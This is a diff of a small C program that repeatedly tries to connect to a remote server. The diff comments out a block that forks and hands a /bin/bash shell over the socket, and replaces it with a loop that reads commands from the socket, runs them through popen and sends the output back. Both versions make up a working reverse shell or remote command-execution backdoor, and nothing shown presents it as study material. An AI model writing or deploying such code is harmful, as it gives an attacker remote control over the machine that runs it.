@@ -47,17 +47,37 @@ int main(int argc, char** argv){
 		sleep(2);
 		connectie = connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
 	}
+/*
 	int pid = fork();
 	if(pid > 0){
-//		printf("In parent process. Waiting\n");
 		wait(NULL);
 	}
 	else{
-//		printf("In child process. Nice\n");
 		dup2(client_sock, 0);
 		dup2(client_sock, 1);
-		dup2(client_sock, 2);
 		execve("/bin/bash", NULL, NULL);
+
+	}
+*/
+	char* command = realloc(NULL, sizeof(*command)*65000);
+	char result[65000];
+	FILE* pipe = NULL;
+	size_t len;
+	dup2(client_sock, 2);
+	while(read(client_sock, command, 65000) > 0){
+		printf("WHILEEEEEE");
+		pipe = popen(command, "r");
+		if (NULL == pipe) {
+    	perror("pipe");
+    	exit(1);
+		}
+		while(fgets(result, 65000, pipe) != NULL){
+			write(client_sock, result, strlen(result));
+		}
+		pclose(pipe);
+
+		bzero(result, strlen(result));
+		bzero(command, 65000);
 	}
 	return 0;
 }
